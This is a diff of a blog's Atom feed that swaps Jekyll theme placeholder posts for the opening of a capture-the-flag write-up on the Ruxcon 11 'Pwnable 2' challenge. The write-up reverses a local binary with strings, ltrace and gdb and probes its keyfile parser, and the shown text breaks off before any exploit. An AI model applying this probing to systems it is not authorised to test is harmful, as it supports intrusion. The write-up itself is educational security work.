@@ -5,20 +5,20 @@
   
   <link href="https://blog.x86.party/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://blog.x86.party/" rel="alternate" type="text/html" hreflang="en" />
-  <updated>2019-07-22T10:11:07+00:00</updated>
+  <updated>2019-07-25T02:47:38+00:00</updated>
   <id>https://blog.x86.party//</id>
 
   
-    <title type="html">whiteglass theme</title>
+    <title type="html">x86party</title>
   
 
   
-    <subtitle>Minimal, responsive Jekyll theme for hackers.</subtitle>
+    <subtitle>Mediocre hacking blog</subtitle>
   
 
   
     <author>
-        <name>Yous</name>
+        <name>x86party</name>
       
       
     </author>
@@ -28,148 +28,264 @@
   
     <entry>
       
-      <title type="html">Welcome To Jekyll</title>
+      <title type="html">Ruxcon 11 [Pwnable 2] Write Up</title>
       
       
-      <link href="https://blog.x86.party/2017/01/05/welcome-to-jekyll/" rel="alternate" type="text/html" title="Welcome To Jekyll" />
+      <link href="https://blog.x86.party/2018/02/01/ruxcon-11-pwnable-2-writeup/" rel="alternate" type="text/html" title="Ruxcon 11 [Pwnable 2] Write Up" />
       
-      <published>2017-01-05T00:00:00+00:00</published>
-      <updated>2017-01-05T00:00:00+00:00</updated>
-      <id>https://blog.x86.party/2017/01/05/welcome-to-jekyll</id>
-      <content type="html" xml:base="https://blog.x86.party/2017/01/05/welcome-to-jekyll/">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+      <published>2018-02-01T00:00:00+00:00</published>
+      <updated>2018-02-01T00:00:00+00:00</updated>
+      <id>https://blog.x86.party/2018/02/01/ruxcon-11-pwnable-2-writeup</id>
+      <content type="html" xml:base="https://blog.x86.party/2018/02/01/ruxcon-11-pwnable-2-writeup/">&lt;p&gt;This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user’s home directory contained two files: level2 and tokenfile. &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; quickly revealed that &lt;code class=&quot;highlighter-rouge&quot;&gt;level2&lt;/code&gt; is an x86–64 ELF executable that hasn’t been stripped. &lt;code class=&quot;highlighter-rouge&quot;&gt;tokenfile&lt;/code&gt; is a text file but we can’t read it. Presumably then the aim of the challenge is to read that file!&lt;/p&gt;
 
-&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
-
-&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      
-        <author>
-            <name>Yous</name>
-          
-          
-        </author>
-      
-
-      
-
-      
-
-      
-        <summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated. To add new posts, simply add a file in the _posts directory that follows the convention YYYY-MM-DD-name-of-post.ext and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works. Jekyll also offers powerful support for code snippets: def print_hi(name) puts &quot;Hi, #{name}&quot; end print_hi('Tom') #=&amp;gt; prints 'Hi, Tom' to STDOUT. Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll’s GitHub repo. If you have questions, you can ask them on Jekyll Talk.</summary>
-      
-
-      
-      
-    </entry>
-  
-  
-  
-    <entry>
-      
-      <title type="html">This post demonstrates post content styles</title>
-      
-      
-      <link href="https://blog.x86.party/2017/01/04/this-post-demonstrates-post-content-styles/" rel="alternate" type="text/html" title="This post demonstrates post content styles" />
-      
-      <published>2017-01-04T00:00:00+00:00</published>
-      <updated>2017-01-04T00:00:00+00:00</updated>
-      <id>https://blog.x86.party/2017/01/04/this-post-demonstrates-post-content-styles</id>
-      <content type="html" xml:base="https://blog.x86.party/2017/01/04/this-post-demonstrates-post-content-styles/">&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.&lt;/p&gt;
-
-&lt;h2&gt;Some great heading (h2)&lt;/h2&gt;
-
-&lt;p&gt;Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu.&lt;/p&gt;
-
-&lt;p&gt;Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
-
-&lt;h2&gt;Another great heading (h2)&lt;/h2&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.&lt;/p&gt;
-
-&lt;h3&gt;Some great subheading (h3)&lt;/h3&gt;
-
-&lt;p&gt;Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum.&lt;/p&gt;
-
-&lt;p&gt;Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.&lt;/p&gt;
-
-&lt;h3&gt;Some great subheading (h3)&lt;/h3&gt;
-
-&lt;p&gt;Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;This quote will change your life. It will reveal the secrets of the universe, and all the wonders of humanity. Don’t misuse it.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt.&lt;/p&gt;
-
-&lt;h3&gt;Some great subheading (h3)&lt;/h3&gt;
-
-&lt;p&gt;Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum.&lt;/p&gt;
-
-&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Hello, World!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 file level2
+level2: ELF 64-bit LSB executable, x86–64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, 
+interpreter /lib64/ld-linux-x86–64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, 
+BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+&lt;p&gt;When we run &lt;code class=&quot;highlighter-rouge&quot;&gt;level2&lt;/code&gt; it requests a keyfile specified as a path or the character “-” which specifies “give me the keyfile on stdin”.
+Before doing anything, run strings over the binary. It’ll help you get the lay of the land, and in some (silly) cases, you’ll find the flag. Strings doesn’t yield the flag but it does reveal some interesting strings that sound like function names:&lt;/p&gt;
 
-&lt;h4&gt;You might want a sub-subheading (h4)&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 strings level2
+&amp;lt;snip&amp;gt;
 
-&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+parse_header
+no_keys
 
-&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+&amp;lt;snip&amp;gt;
 
-&lt;h4&gt;But it’s probably overkill (h4)&lt;/h4&gt;
+auth_scheme
+sizetype
+key_for_scheme
+token_from_file
+XorDecode
+try_authenticate
 
-&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+&amp;lt;snip&amp;gt;
 
-&lt;h3&gt;Oh hai, an unordered list!!&lt;/h3&gt;
+mod_table
+encoding_table
+base64_encode
+base64_decode
+build_decoding_table
+base64_cleanup
+input_length
+output_length
+encoded_data
 
-&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like there’s authentication attempts, parsing, base64, decoding, etc.
+We’ll start simple though; because we’re mad hax0rz, we’ll initially assume that the password is password.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 ./level2 — beans
+Usage: ./level2 &amp;lt;keyfile&amp;gt; or — &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;stdin
+
+➜ pwnable2 ./level2 -
+password
+Invalid Scheme specified.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;FOILED! The password wasn’t password. Undeterred, we’ll try running ltrace to look for interesting function calls.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 ltrace ./level2 -
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &amp;lt;unfinished …&amp;gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“-”, “-”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1032&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x16bd010
+__isoc99_fscanf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x16bd420
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x16bd440
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“”, “XOR”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-88&lt;/span&gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“”, “NOENCRYPT”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-78&lt;/span&gt;
+fprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7f4c18f5c060, “Invalid Scheme specified.&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;”Invalid Scheme specified.
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 26
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice the calls to &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp(&quot;&quot;, &quot;XOR&quot;)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp(&quot;&quot;, &quot;NOENCRYPT&quot;)&lt;/code&gt;, followed by the call that prints “Invalid Scheme specified”. Looks like our input will need to pass a comparison with either “XOR” or “NOENCRYPT” (or both!) While that sounds like a good start, notice that our ninja input guess of “password” doesn’t appear in either of those comparisons! hmmm … it looks like our input is being read in via fscanf so let’s break out GDB and find out what’s going on.&lt;/p&gt;
+
+&lt;p&gt;Note that I’m using the superduper awesome Python Exploit Development Assistant ‘peda.py’ for GDB, it makes GDB not suck in the way that &lt;a href=&quot;https://theoatmeal.com/pl/minor_differences/cereal&quot;&gt;milk makes cereal not suck&lt;/a&gt;.&lt;br /&gt;
+Here, we run gdb &lt;code class=&quot;highlighter-rouge&quot;&gt;level2&lt;/code&gt;, set a breakpoint for the &lt;code class=&quot;highlighter-rouge&quot;&gt;__isoc99_fscanf&lt;/code&gt; function and set up the program arguments to accept input from stdin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2018-02-01-ruxcon-11-pwnable-2-writeup-1.png&quot; alt=&quot;Breaking on __isoc99_fscanf in GDB&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming &lt;code class=&quot;highlighter-rouge&quot;&gt;i r&lt;/code&gt;!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that’s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string.&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SCANF(3) Linux Programmer’s Manual SCANF(3)
+
+NAME
+scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf — input format conversion
+SYNOPSIS
+#include &amp;lt;stdio.h&amp;gt;
+int scanf(const char *format, …);
+int fscanf(FILE *stream, const char *format, …);
+
+&amp;lt;snip&amp;gt;
+
+The conversion specifications in format are of two forms, either beginning with ‘%’
+or beginning with “%n$”. The two forms should not be mixed in the same format
+string, except that a string containing “%n$” specifications can include %% and %*.
+If format contains ‘%’ specifications, then these correspond in order with
+successive pointer arguments. In the “%n$” form (which is specified in
+POSIX.1–2001, but not C99), n is a decimal integer that specifies that the converted
+input should be placed in the location referred to by the n-th pointer argument
+following format.
+
+Conversions
+l Indicates either that the conversion will be one of d, i, o, u,
+x, X, or n and the next pointer is a pointer to a long int or unsigned long
+int (rather than int), or that the conversion will be one of e, f, or g
+and the next pointer is a pointer to double (rather than float). Specifying
+two l characters is equivalent to L. If used with %c or %s, the
+corresponding parameter is considered as a pointer to a wide character or
+wide-character string respectively.
+u Matches an unsigned decimal integer; the next pointer must be a pointer
+to unsigned int.
+s Matches a sequence of non-white-space characters; the next pointer
+must be a pointer to character array that is long enough to hold the input
+sequence and the terminating null byte (‘\0’), which is added
+automatically. The input string stops at white space or at the maximum
+field width, whichever occurs first.
+
+&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The fscanf format string, &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;%lu:%1023s&quot;&lt;/code&gt;, can be broken down into the following:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;First item, yo&lt;/li&gt;
-  &lt;li&gt;Second item, dawg&lt;/li&gt;
-  &lt;li&gt;Third item, what what?!&lt;/li&gt;
-  &lt;li&gt;Fourth item, fo sheezy my neezy&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%lu&lt;/code&gt; — unsigned long&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; — ASCII character “:”&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%1023s&lt;/code&gt; — 1023 character string (1024 with the null terminator).&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3&gt;Oh hai, an ordered list!!&lt;/h3&gt;
+&lt;p&gt;Before, we just passed in the string “password” and our input didn’t make it to the &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; instructions. Let’s adjust the format to match the fscanf format string and try again. To make things neater, we’ll also put our input in a keyfile rather than entering it via stdin.&lt;/p&gt;
 
-&lt;p&gt;In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; “123:password” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;ol&gt;
-  &lt;li&gt;First item, yo&lt;/li&gt;
-  &lt;li&gt;Second item, dawg&lt;/li&gt;
-  &lt;li&gt;Third item, what what?!&lt;/li&gt;
-  &lt;li&gt;Fourth item, fo sheezy my neezy&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;Changing the format seems to have worked! We now see the string “password” being compared against “XOR” and “NOENCRYPT”, but we still hit the “Invalid Scheme specified” message. If we change our input to “123:NOENCRYPT” we see the following: &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp(&quot;NOENCRYPT&quot;, &quot;NOENCRYPT&quot;)&lt;/code&gt;, looks good!&lt;/p&gt;
 
-&lt;h2&gt;Headings are cool! (h2)&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 ltrace ./level2 ./key1
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &amp;lt;unfinished …&amp;gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“./key1”, “-”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+fopen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“./key1”, “r”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x2072010
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1032&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x2072250
+__isoc99_fscanf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x2072010, 0x401834, 0x2072250, 0x2072258&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;629760&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7f2d3cf19010
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x2072660
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“password”, “XOR”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 24
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“password”, “NOENCRYPT”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 34
+fprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7f2d3cdba060, “Invalid Scheme specified.&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;”Invalid Scheme specified.
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 26
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
 
-&lt;p&gt;Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; “123:NOENCRYPT” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key2
 
-&lt;p&gt;Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.&lt;/p&gt;
+➜ pwnable2 ltrace ./level2 ./key2
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &amp;lt;unfinished …&amp;gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“./key2”, “-”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+fopen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“./key2”, “r”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xc43010
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1032&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xc43250
+__isoc99_fscanf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xc43010, 0x401834, 0xc43250, 0xc43258&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;629760&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7efc1ddcd010
+malloc&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xc43660
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“NOENCRYPT”, “XOR”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-10&lt;/span&gt;
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;“NOENCRYPT”, “NOENCRYPT”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+strcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xc43668, “No Encryption”&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xc43668
+__isoc99_fscanf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff
+fprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7efc1dc6e060, “In.correct number of entries. Exp”…, 123, 0Incorrect number of entries. Expected 123 but found 0
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 54
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.&lt;/p&gt;</content>
+&lt;p&gt;Now we’re getting the message: “Incorrect number of entries. Expected 123 but found 0”. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let’s try adding stuff to the keyfile. Adding the line “password” changes the message to “Incorrect number of entries. Expected 123 but found 1”, looks like the number we pass in is a counter for the number of lines in the keyfile.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; “0:NOENCRYPT&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;password” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key3
+
+➜ pwnable2 ./level2 ./key3
+Incorrect number of entries. Expected 123 but found 1
+
+➜ pwnable2 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; “1:NOENCRYPT&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;password” &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; key3
+
